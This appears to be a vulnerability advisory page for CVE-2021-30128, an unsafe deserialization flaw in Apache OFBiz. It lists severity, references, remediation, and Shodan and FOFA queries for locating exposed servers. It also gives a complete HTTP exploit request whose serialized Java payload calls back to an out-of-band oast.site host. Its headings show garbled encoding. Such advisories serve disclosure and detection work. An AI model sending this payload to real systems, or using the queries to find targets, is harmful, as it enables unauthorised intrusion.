---
layout: "post"
cve_id: "CVE-2021-30128"
title: "Apache OFBiz <17.12.07 - Arbitrary Code Execution"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-30128.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-30128.yaml"
author: "For3stCo1d"
severity: "critical"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.
"
remediation: "Upgrade Apache OFBiz to version 17.12.07 or later to mitigate this vulnerability.
"
reference:
  - "https://lists.apache.org/thread.html/rbe8439b26a71fc3b429aa793c65dcc4a6e349bc7bb5010746a74fa1d@%3Ccommits.ofbiz.apache.org%3E"
  - "https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743%40%3Cdev.ofbiz.apache.org%3E"
  - "https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743@%3Cdev.ofbiz.apache.org%3E"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-30128"
  - "http://www.openwall.com/lists/oss-security/2021/04/27/5"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2021-30128', 'cwe-id': 'CWE-502', 'epss-score': 0.93353, 'epss-percentile': 0.99801, 'cpe': 'cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'apache', 'product': 'ofbiz', 'shodan-query': ['http.html:"ofbiz"', 'ofbiz.visitor='], 'fofa-query': ['app="Apache_OFBiz"', 'body="ofbiz"', 'app="apache_ofbiz"']}"
tags:
  - "cve2021"
  - "cve"
  - "apache"
  - "ofbiz"
  - "deserialization"
  - "rce"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Apache OFBiz before 17.12.07 is susceptible to arbitrary code execution via unsafe deserialization. An attacker can modify deserialized data or code without using provided accessor functions.

## ðŸŒ HTTP Request
```nohighlight
POST /webtools/control/SOAPService HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:31.0) Gecko/20100101 Firefox/31.0
Connection: close
Content-Length: 1141
Content-Type: text/xml
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">
  <soapenv:Header/>
    <soapenv:Body>
      <ser>
        <map-Map>
          <map-Entry>
            <map-Key>
              <cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74002b643569753732706c65306f32666835366c6562303437687a7836746d38397436392e6f6173742e7369746574000071007e00057400046874747073707874003368747470733a2f2f643569753732706c65306f32666835366c6562303437687a7836746d38397436392e6f6173742e7369746578</cus-obj>
            </map-Key>
          <map-Value>
        <std-String/>
        </map-Value>
        </map-Entry>
      </map-Map>
      </ser>
    </soapenv:Body>
</soapenv:Envelope>
```

